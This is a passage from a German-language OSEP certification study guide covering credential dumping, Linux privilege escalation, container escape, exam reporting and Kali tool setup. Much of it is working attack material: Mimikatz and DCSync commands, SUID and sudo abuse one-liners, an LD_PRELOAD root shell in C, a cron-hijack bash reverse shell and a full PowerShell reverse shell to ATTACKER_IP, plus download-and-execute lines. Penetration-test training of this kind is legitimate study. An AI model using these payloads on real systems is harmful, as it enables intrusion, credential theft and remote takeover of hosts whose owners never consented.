# Methode 3: DCSync (mit Mimikatz oder Impacket)
mimikatz # lsadump::dcsync /domain:security.local /all /csv

secretsdump.py security/administrator:Password123!@192.168.100.10 -just-dc-ntlm
```

**Technik 4: LaZagne - Multi-Purpose**

```bash
# LaZagne dumpt Credentials von vielen Anwendungen

# Auf Windows-Host:
.\lazagne.exe all

# Output zeigt:
# - Browser-Passwörter (Chrome, Firefox, Edge)
# - WiFi-Passwörter
# - Gespeicherte Windows-Credentials
# - Datenbank-Credentials
# - Mail-Clients
# - FTP-Clients
# - Etc.

# Specific Modules:
.\lazagne.exe browsers
.\lazagne.exe wifi
.\lazagne.exe databases
```

**Technik 5: Registry Secrets**

```powershell
# DPAPI Master Keys
dir C:\Users\*\AppData\Roaming\Microsoft\Protect\
dir C:\Users\*\AppData\Local\Microsoft\Protect\

# Mit Mimikatz:
mimikatz # dpapi::masterkey /in:"C:\Users\Admin\AppData\Roaming\Microsoft\Protect\S-1-5-21...\..." /rpc

# Autologon Credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC Passwords
reg query HKCU\Software\ORL\WinVNC3\Password

# SNMP Community Strings
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

# Putty Saved Sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```

**2-Wochen Credential Harvesting Training:**

```plaintext
Woche 1: Windows Credential Dumping
- Tag 1-2: Mimikatz in allen Varianten
- Tag 3-4: LSASS Dumping ohne Mimikatz
- Tag 5-7: NTDS.dit Extraction (alle Methoden)

Woche 2: Alternativen und Integration
- Tag 1-2: LaZagne für Application Credentials
- Tag 3-4: DPAPI und Registry Secrets
- Tag 5-7: Full Domain Compromise mit gecrackelten Credentials
```

---

## 6. Linux Post-Exploitation - Praktisch

**Kurze Erklärung:** In der OSEP-Prüfung gibt es oft Linux-Hosts als Pivot-Punkte oder Initial Access.

### Praktisches Linux PrivEsc:

**Setup Linux Lab:**

```bash
# Nutze VulnHub VMs oder:
# Docker-Container für schnelles Testing:

docker run -it --rm ubuntu:20.04 /bin/bash

# Erstelle vulnerable Setup:
useradd -m lowpriv
echo "lowpriv:password" | chpasswd
chmod u+s /usr/bin/find  # SUID bit für testing
```

**Enumeration - Das Wichtigste zuerst:**

```bash
# === MANUAL ENUMERATION ===

# 1. Kernel Version (für Exploits als letzte Option)
uname -a
cat /proc/version

# 2. SUID Binaries (Goldgrube!)
find / -perm -4000 -type f 2>/dev/null

# 3. Sudo Rechte
sudo -l

# 4. Capabilities
getcap -r / 2>/dev/null

# 5. Writable /etc/passwd
ls -la /etc/passwd

# 6. Cronjobs
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# 7. Running Processes (für path hijacking)
ps aux

# 8. Network Services (internal pivoting)
netstat -tulpn
ss -tulpn

# 9. Interessante Files
find / -name "*.conf" 2>/dev/null | grep -v "proc"
find / -name "*.bak" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null

# 10. Docker/Container Check
cat /proc/1/cgroup
ls -la /.dockerenv
```

**Automated Enumeration:**

```bash
# 1. LinPEAS (Best)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Oder transfer:
wget http://YOUR_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 2. LinEnum
wget http://YOUR_IP/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# 3. Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

**PrivEsc Technik 1: SUID Abuse**

```bash
# Wenn find SUID hat:
find / -exec /bin/sh -p \; -quit

# Wenn vim SUID hat:
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Wenn python SUID hat:
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Nutze GTFOBins für jede Binary:
# https://gtfobins.github.io/

# Beispiel - nmap (alte Versionen):
nmap --interactive
!sh

# Base64:
base64 /etc/shadow | base64 -d

# cp (copy /etc/passwd, modifiziere, copy zurück):
cp /etc/passwd /tmp/passwd
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
```

**PrivEsc Technik 2: Sudo Abuse**

```bash
# Nach sudo -l, wenn du siehst:
# (ALL) NOPASSWD: /usr/bin/vim

# Exploit:
sudo vim -c ':!/bin/sh'

# Wenn du siehst:
# (ALL) NOPASSWD: /usr/bin/python

sudo python -c 'import os; os.system("/bin/bash")'

# LD_PRELOAD Trick (wenn sudo env_keep+="LD_PRELOAD"):
# Erstelle preload.c:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# Kompiliere:
gcc -fPIC -shared -o preload.so preload.c -nostartfiles

# Execute:
sudo LD_PRELOAD=/tmp/preload.so apache2
```

**PrivEsc Technik 3: Capabilities**

```bash
# Wenn python cap_setuid hat:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Wenn perl cap_setuid hat:
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Wenn tar cap_dac_read_search hat (Read any file):
tar -cvf archive.tar /etc/shadow
tar -xvf archive.tar
cat etc/shadow
```

**PrivEsc Technik 4: Cronjob Path Hijacking**

```bash
# Wenn ein Cronjob ein Script ohne vollen Path ausführt:
# /etc/crontab zeigt:
# * * * * * root backup.sh

# Erstelle deinen backup.sh:
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

chmod +x backup.sh

# Stelle sicher, dass dein PATH früher durchsucht wird:
export PATH=/tmp:$PATH

# Oder platziere in /usr/local/bin wenn writable
```

**PrivEsc Technik 5: Writable /etc/passwd**

```bash
# Wenn /etc/passwd writable ist:

# Generiere Password Hash:
openssl passwd -1 -salt xyz password123
# Output: $1$xyz$...hash...

# Füge User hinzu:
echo 'hacker:$1$xyz$...hash...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login:
su hacker
# Password: password123
```

**Container Escape (Docker):**

```bash
# Check if in container:
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# If you have access to Docker socket:
ls -la /var/run/docker.sock

# Exploit Docker socket:
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash

# CVE-2019-5736 (RunC escape):
# https://github.com/Frichetten/CVE-2019-5736-PoC

# If privileged container:
# Mount host filesystem
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host

# Add SSH key to host:
echo "YOUR_SSH_KEY" >> /tmp/host/root/.ssh/authorized_keys
```

**1-Woche Linux PrivEsc Bootcamp:**

```plaintext
Tag 1: SUID Binaries
- Finde und exploite 20 verschiedene SUID Binaries
- Memoriere GTFOBins für Top 10

Tag 2: Sudo Abuse
- Alle sudo -l Varianten
- LD_PRELOAD Trick perfektionieren

Tag 3: Capabilities & Cronjobs
- Capabilities-basierte Exploits
- Cronjob Hijacking in 5 Szenarien

Tag 4: Automated Enumeration
- LinPEAS Output interpretieren
- Schnell die wichtigen Findings identifizieren

Tag 5-7: CTF Practice
- HackTheBox Easy/Medium Linux-Boxen
- TryHackMe Linux PrivEsc Rooms
- Ziel: 10 Boxen in 3 Tagen
```

---

## 7. Reporting & Documentation - Praktisch

**Kurze Erklärung:** Die OSEP-Prüfung beinhaltet einen 24-Stunden-Report. Der Report ist genauso wichtig wie die technische Arbeit.

### Report-Template vorbereiten:

**Erstelle deine Vorlage:**

```markdown
# OSEP Exam Report - [DEIN NAME]
## OSEP-XXXXX

---

## Table of Contents
1. Executive Summary
2. Exam Objectives
3. Target Information
4. Initial Foothold
5. Privilege Escalation
6. Lateral Movement
7. Proof Screenshots
8. Appendix - Methodology

---

## 1. Executive Summary

[2-3 Paragraphen über:
- Was wurde getestet
- Was wurde gefunden
- Kritische Findings
- Empfehlungen]

---

## 2. Exam Objectives

The following objectives were accomplished during the examination:
- [ ] Obtain proof.txt from Host 1
- [ ] Obtain proof.txt from Host 2
- [ ] Obtain proof.txt from Host 3
- [ ] Obtain secret.txt

---

## 3. Host: [HOSTNAME/IP]

### 3.1 Initial Access

**Vulnerability:** [Name der Schwachstelle]

**Description:** [Beschreibung was du gefunden hast]

**Exploitation Steps:**

1. Step 1 description
```bash
command here
output here
```

2. Step 2 description
```bash
command here
output here
```

[SCREENSHOT: Initial shell with whoami/hostname]

**Proof of Exploitation:**
- Local.txt: [HASH]
- Screenshot: [Reference]

---

### 3.2 Privilege Escalation

**Vulnerability:** [Privilege Escalation Vector]

**Discovery:**
```bash
enumeration command
relevant output
```

**Exploitation:**
```bash
exploit command
output showing SYSTEM/root
```

[SCREENSHOT: Elevated privileges showing proof.txt]

**Proof:**
- Proof.txt: [HASH]
- Screenshot: [Reference]

---

### 3.3 Lateral Movement to [NEXT HOST]

**Method:** [Pass-the-Hash/Kerberos/etc]

**Steps:**
1. Credential harvesting
```bash
command
output
```

2. Lateral movement
```bash
command
output
```

[SCREENSHOT: Shell on new host]

---

## Appendix A: Proof Contents

Host 1 (192.168.x.x):
- local.txt: [HASH]
- proof.txt: [HASH]

Host 2 (192.168.x.x):
- local.txt: [HASH]
- proof.txt: [HASH]

...

---

## Appendix B: Methodology

### Tools Used:
- Nmap 7.92
- BloodHound 4.2
- Rubeus
- Chisel
- Custom Shellcode Runner

### Attack Path Summary:
[High-level diagram or description]

---

## Appendix C: Code Listings

### Custom Exploit Code
```python
# Your custom scripts
```
```

**Während der Prüfung - Screenshot-Checklist:**

```plaintext
FÜR JEDEN HOST:

Initial Access:
□ Proof of initial shell (whoami, hostname, ipconfig/ifconfig)
□ Contents of local.txt mit type/cat command sichtbar
□ Hash des local.txt

Privilege Escalation:
□ Enumeration output der Schwachstelle
□ Execution des Exploits
□ Elevated shell (NT AUTHORITY\SYSTEM oder root)
□ Contents of proof.txt mit type/cat command sichtbar
□ Hash des proof.txt

Lateral Movement:
□ Credential harvesting output
□ Lateral movement command
□ New shell on new host
□ ipconfig/ifconfig auf neuem Host

WICHTIG:
- Jeder Screenshot muss Datum/Zeit zeigen
- Taskbar oder Terminal-Timestamp sichtbar
- Voller Command + Output sichtbar
- Nicht nur die Hashes, sondern der gesamte Befehl
```

**Screenshot-Automation:**

```powershell
# PowerShell Script für automatische Screenshots mit Timestamp:

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Take-Screenshot {
    param([string]$Path = "C:\Temp\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png")
    
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    $bitmap.Save($Path)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    Write-Host "[+] Screenshot saved to: $Path"
}

# Usage:
Take-Screenshot
```

**Report Writing - Best Practices:**

```plaintext
TAG 1-2 der Prüfung (48h):
- Mache Screenshots SOFORT nach jedem Erfolg
- Erstelle eine simple notes.txt mit Zeitstempel:
  
  12:30 - Initial shell on 192.168.100.10
  13:45 - Privesc to SYSTEM via SeImpersonatePrivilege
  15:20 - Lateral movement to 192.168.100.11 via PTH
  
- Kopiere alle verwendeten Commands in command_history.txt
- Organisiere Screenshots nach Host: Host1/, Host2/, etc.

TAG 3 (24h Report):
Stunden 1-4: Template füllen
- Executive Summary schreiben
- Objectives checken
- Proof Hashes eintragen

Stunden 5-12: Technical Details
- Jeden Host detailliert beschreiben
- Screenshots einfügen
- Commands und Output formatieren
- Code-Listings hinzufügen

Stunden 13-18: Review & Polish
- Rechtschreibung prüfen
- Screenshots nochmal checken
- Sicherstellen, dass jeder Schritt reproduzierbar ist
- Formatting konsistent

Stunden 19-23: Final Review
- Kompletten Report nochmal durchlesen
- Checklist durchgehen
- PDF generieren
- Backup erstellen

Stunde 24: Submit
- Final PDF prüfen
- 7z Archive erstellen mit Passwort
- Hochladen
- Bestätigung erhalten
```

**Report Checklist vor Submit:**

```plaintext
□ Executive Summary vorhanden (2-3 Absätze)
□ Alle Objectives aufgelistet
□ Jeder Host hat eigenen Abschnitt
□ Jeder Abschnitt hat:
  □ Initial Access beschrieben
  □ Privilege Escalation beschrieben
  □ Screenshots mit Timestamp
  □ Commands mit Output
  □ local.txt Hash
  □ proof.txt Hash
□ Lateral Movement Paths dokumentiert
□ Appendix mit allen Proof Hashes
□ Tools-Liste vorhanden
□ Custom Code im Appendix
□ Keine Rechtschreibfehler
□ Konsistente Formatierung
□ PDF unter 100MB
□ 7z Archive erstellt mit Passwort "osep"
```

---

## 8. Exam Strategy - Praktisch

**Zeitmanagement für 48h:**

```plaintext
STUNDEN 0-2: Reconnaissance
- VPN verbinden und testen
- Alle Hosts identifizieren
- Nmap-Scans starten
- Control Panel lesen und verstehen
- Objectives klar definieren
- Notizen-Struktur aufsetzen

STUNDEN 2-12: Initial Access Phase
- Schwächste Einstiegspunkte identifizieren
- Web-App Testing wenn vorhanden
- Service-Exploitation
- ZIEL: Mindestens 1 Host kompromittiert
- Wenn nach 6h kein Shell: Pause und neu denken

STUNDEN 12-24: Privilege Escalation & Lateral Movement
- Privesc auf Initial Host
- BloodHound Daten sammeln
- AD-Enumeration
- Credential harvesting
- Erste Lateral Movements
- ZIEL: 2 Hosts vollständig + Domain User

STUNDEN 24-36: Deeper Penetration
- Weitere Hosts kompromittieren
- Domain Admin als Ziel
- Alternative Paths versuchen
- Pivot-Chains aufbauen
- ZIEL: 3+ Hosts + erhöhte Privilegien

STUNDEN 36-44: Cleanup & Final Objectives
- Alle proof.txt sammeln
- Secret.txt finden
- Screenshots organisieren
- Commands dokumentieren
- Backup aller Daten

STUNDEN 44-48: Buffer Zeit
- Stuck? Neue Enumeration
- Alternative Angriffswege
- Im Notfall: Metasploit nutzen (wenn erlaubt)
- Mental Break nehmen

STUNDEN 48-72: Report Writing
(Siehe vorheriger Abschnitt)
```

**Wenn du stecken bleibst (Praktischer Troubleshooting-Guide):**

```plaintext
STUCK bei Initial Access (0-12h):

1. Re-Enumerate ALLES:
   □ Nmap mit allen Scripts: nmap -sC -sV -p- --script vuln
   □ Web Dir Busting: gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,txt
   □ Subdomain Enum: wfuzz -c -f sub-fighter -w /usr/share/wordlists/subdomains-top1million-5000.txt -u 'http://FUZZ.target.com'
   □ SMB Shares: smbmap -H target, smbclient -L //target
   □ Credentials Bruteforce (als letztes Mittel)

2. Web-Apps gründlich testen:
   □ SQL Injection: sqlmap -u "http://target/page.php?id=1" --batch
   □ Command Injection: Alle Inputs testen
   □ File Upload: Teste verschiedene Extensions
   □ LFI/RFI: ../../../etc/passwd, ..\..\..\..\windows\system32\config\sam

3. Service-Specific:
   □ FTP: anonymous login, check version for exploits
   □ SSH: Username enumeration, check known vulnerabilities
   □ RDP: Check for BlueKeep if old version
   □ SMB: EternalBlue wenn Server 2008/Win7

STUCK bei Privilege Escalation (12-24h):

1. Windows:
   □ Run WinPEAS: .\winPEASx64.exe
   □ PowerUp: powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1'); Invoke-AllChecks"
   □ Check SeImpersonate: whoami /priv (Wenn ja: JuicyPotato/PrintSpoofer)
   □ Check AlwaysInstallElevated: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
   □ Unquoted Service Paths: wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows"
   □ Writable Services: accesschk.exe -uwcqv *
   □ Scheduled Tasks: schtasks /query /fo LIST /v

2. Linux:
   □ Run LinPEAS: ./linpeas.sh
   □ SUID: find / -perm -4000 -type f 2>/dev/null
   □ Sudo: sudo -l
   □ Capabilities: getcap -r / 2>/dev/null
   □ Cronjobs: cat /etc/crontab, ls -la /etc/cron*
   □ Writable /etc/passwd: ls -la /etc/passwd

STUCK bei Lateral Movement (24-36h):

1. Credential Re-Use:
   □ Alle gefundenen Credentials gegen alle Hosts testen
   □ CrackMapExec Spray: crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
   □ Password Pattern: Wenn du "Summer2023!" siehst, teste "Winter2024!", "Spring2024!"

2. BloodHound Deep Dive:
   □ Suche nach: Kerberoastable Users, AS-REP Roastable, Unconstrained Delegation
   □ Shortest Paths from Owned Principals
   □ "Exploitable Paths" Query
   □ Check für Passwords in Description Fields

3. Alternative Movement:
   □ MSSQL Links: Get-SQLServerLinkCrawl -Instance server
   □ Group Policy Abuse: Writable GPOs
   □ Certificate Services: Certify.exe find /vulnerable

STUCK nach 36h (Panic Mode):

1. Take a REAL break:
   □ 30 Minuten weg vom Computer
   □ Geh spazieren
   □ Iss etwas
   □ Komm mit frischem Kopf zurück

2. Fundamental Re-Assessment:
   □ Lese Exam Guide nochmal
   □ Checke ob du etwas übersehen hast
   □ Liste alle Findings nochmal auf
   □ Gibt es ungetestete Hosts?

3. Community (erlaubte Ressourcen):
   □ OffSec Forum lesen (keine Fragen posten!)
   □ Google für spezifische Techniken
   □ Documentation der Tools nochmal lesen

4. Last Resort:
   □ Metasploit wenn Punkte erlaubt (check Exam Guide)
   □ Public Exploits für identified Versions
   □ Kernel Exploits (instabil, nur wenn nichts anderes)
```

**Mental Health während 48h:**

```plaintext
WICHTIG: Du bist ein Mensch, kein Roboter!

Pausen-Schedule:
- Stunde 0-4: Arbeiten
- Stunde 4-4.5: Erste kleine Pause (10-15 Min)
- Stunde 4.5-8: Arbeiten
- Stunde 8-9: Längere Pause - ESSEN! (30-60 Min)
- Stunde 9-13: Arbeiten
- Stunde 13-14: Mittag + Power Nap möglich (60 Min)
- ... repeat pattern

Schlaf-Strategie:
- Option 1: Erste Nacht durchmachen, Tag 2 für 4-6h schlafen
- Option 2: Jede Nacht normal schlafen (8h) - insgesamt ruhiger
- Option 3: Power Naps (20-30 Min alle 6h)
- WÄHLE VORHER was zu dir passt!

Essen & Trinken:
- Bereite Mahlzeiten VOR der Prüfung vor
- Wasser immer griffbereit
- Snacks: Nüsse, Obst (nicht nur Zucker!)
- Caffeine in Maßen (nicht übertreiben)
- Proper Meals zu geplanten Zeiten

Physisch:
- Stehe jede Stunde kurz auf
- Strecke dich
- Kurze Augenübungen (weg vom Bildschirm schauen)
- Frische Luft in Pausen

Mental:
- Wenn frustriert: PAUSE
- Selbstgespräche sind OK: "Ich schaffe das"
- Fortschritt dokumentieren: "3 Hosts, gut dabei"
- Nicht zu selbstkritisch sein
- Bei Panic: Tief atmen, 5-4-3-2-1 Grounding
```

---

## 9. Tooling & Setup - Praktisch

**Deine Kali VM optimal einrichten:**

```bash
# === ESSENZIELLE TOOLS INSTALLIEREN ===

# System Update
sudo apt update && sudo apt upgrade -y

# Basic Tools
sudo apt install -y python3-pip golang mingw-w64 mono-complete wine winetricks

# Impacket (latest)
sudo pip3 install impacket

# Neo4j & BloodHound
sudo apt install -y neo4j bloodhound

# Chisel (Pivoting)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
sudo mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel

# ligolo-ng (Pivoting)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
sudo mv agent /usr/local/bin/ligolo-agent
sudo mv proxy /usr/local/bin/ligolo-proxy

# Evil-WinRM
sudo gem install evil-winrm

# CrackMapExec (NetExec - neue Version)
pipx install git+https://github.com/Pennyw0rth/NetExec

# Kerbrute
go install github.com/ropnop/kerbrute@latest
sudo cp ~/go/bin/kerbrute /usr/local/bin/

# === WINDOWS TOOLS ORGANISIEREN ===

mkdir ~/tools/windows
cd ~/tools/windows

# Rubeus
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# SharpHound
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe

# Certify
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe

# PowerView
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

# WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# Mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip mimikatz_trunk.zip -d mimikatz

# === WEB SERVER FÜR FILE TRANSFER ===

# Python HTTP Server Alias
echo "alias www='python3 -m http.server 80'" >> ~/.bashrc

# Oder nutze updog (besser)
sudo pip3 install updog
# Usage: updog -p 80

# === TMUX KONFIGURATION ===

cat > ~/.tmux.conf << 'EOF'
# Split windows
bind | split-window -h
bind - split-window -v

# Mouse support
set -g mouse on

# Pane switching with Alt+arrow
bind -n M-Left select-pane -L
bind -n M-Right select-pane -R
bind -n M-Up select-pane -U
bind -n M-Down select-pane -D

# Status bar
set -g status-bg black
set -g status-fg white
EOF

# === WORDLISTS ===

# RockYou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists (essential!)
cd /opt
sudo git clone https://github.com/danielmiessler/SecLists.git
sudo ln -s /opt/SecLists /usr/share/seclists
```

**Quick Command Cheat Sheet erstellen:**

```bash
# Erstelle dein persönliches Cheat Sheet
mkdir ~/osep-exam
cd ~/osep-exam

cat > commands.md << 'EOF'
# OSEP Exam Commands Cheat Sheet

## Initial Enumeration
```bash
# Nmap
sudo nmap -sC -sV -oA nmap/initial 10.10.10.10
sudo nmap -p- -oA nmap/allports 10.10.10.10
sudo nmap -p 445 --script smb-vuln* 10.10.10.10

# Web
gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,txt
nikto -h http://10.10.10.10

# SMB
smbmap -H 10.10.10.10
smbclient -L //10.10.10.10
crackmapexec smb 10.10.10.10 -u '' -p '' --shares
```

## Active Directory
```bash
# Kerberoasting
GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request

# AS-REP Roasting
GetNPUsers.py domain/ -dc-ip 10.10.10.10 -usersfile users.txt

# BloodHound Collection
.\SharpHound.exe -c All -d domain.local --zipfilename output.zip

# DCSync
secretsdump.py domain/user:password@10.10.10.10 -just-dc
```

## Lateral Movement
```bash
# Pass-the-Hash
evil-winrm -i 10.10.10.10 -u administrator -H HASH
psexec.py -hashes :HASH domain/administrator@10.10.10.10

# WinRM
evil-winrm -i 10.10.10.10 -u user -p password

# WMI
wmiexec.py domain/user:password@10.10.10.10
```

## Pivoting
```bash
# Chisel Reverse SOCKS
# Attacker:
chisel server -p 8000 --reverse
# Victim:
.\chisel.exe client ATTACKER_IP:8000 R:socks

# SSH Tunnels
ssh -L 8080:internal_host:80 user@pivot_host
ssh -D 1080 user@pivot_host
```

## File Transfer
```bash
# HTTP Server
python3 -m http.server 80

# Download with PowerShell
powershell -c "IWR -Uri http://ATTACKER_IP/file.exe -OutFile C:\Temp\file.exe"
certutil -urlcache -f http://ATTACKER_IP/file.exe file.exe

# SMB
smbserver.py share . -smb2support
# On Windows:
copy \\ATTACKER_IP\share\file.exe
```

## Reverse Shells
```bash
# Netcat Listener
nc -nlvp 4444

# PowerShell Reverse Shell (Base64)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Privilege Escalation Windows
```bash
# Enumeration
.\winPEASx64.exe
whoami /all
systeminfo

# JuicyPotato (SeImpersonate)
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')" -t *

# PrintSpoofer (SeImpersonate)
.\PrintSpoofer.exe -i -c powershell.exe
```

## Credential Dumping
```bash
# Mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam

# LSASS Dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Transfer and parse:
pypykatz lsa minidump lsass.dmp
```
EOF

# Mache es schnell zugänglich
alias cheat='cat ~/osep-exam/commands.md | less'
echo "alias cheat='cat ~/osep-exam/commands.md | less'" >> ~/.bashrc
```

**Exam Day - Pre-Flight Check:**

```bash
#!/bin/bash
# exam-preflight.sh

echo "=== OSEP Exam Pre-Flight Checklist ==="
echo ""

# VPN Check
echo "[*] Checking VPN connection..."
if ip a | grep -q "tun0"; then
    echo "[+] VPN is connected"
    ip -4 addr show tun0 | grep inet
else
